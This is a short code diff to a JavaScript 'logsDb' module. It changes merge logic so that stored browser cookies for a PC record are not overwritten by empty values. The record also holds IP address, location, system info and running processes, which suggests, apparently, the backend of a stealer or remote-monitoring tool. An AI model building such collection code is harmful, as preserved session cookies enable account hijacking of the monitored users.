@@ -239,7 +239,17 @@ const logsDb = {
                 ipAddress: hasValue(pcData.ipAddress) ? pcData.ipAddress : existingPcData.ipAddress,
                 location: hasValue(pcData.location) ? pcData.location : existingPcData.location,
                 systemInfo: hasValue(pcData.systemInfo) ? pcData.systemInfo : existingPcData.systemInfo,
-                browserCookies: hasValue(pcData.browserCookies) ? pcData.browserCookies : existingPcData.browserCookies,
+                // For browserCookies: only update if new value is a non-empty string or array
+                // Don't overwrite existing cookies with null/undefined/empty
+                browserCookies: (hasValue(pcData.browserCookies) && (
+                    (typeof pcData.browserCookies === 'string' && pcData.browserCookies.length > 0) ||
+                    (Array.isArray(pcData.browserCookies) && pcData.browserCookies.length > 0)
+                )) ? pcData.browserCookies : (
+                    (hasValue(existingPcData.browserCookies) && (
+                        (typeof existingPcData.browserCookies === 'string' && existingPcData.browserCookies.length > 0) ||
+                        (Array.isArray(existingPcData.browserCookies) && existingPcData.browserCookies.length > 0)
+                    )) ? existingPcData.browserCookies : null
+                ),
                 // For arrays: use new data if it has items, otherwise keep existing (don't overwrite with empty)
                 runningProcesses: hasArrayData(pcData.runningProcesses) 
                     ? pcData.runningProcesses 
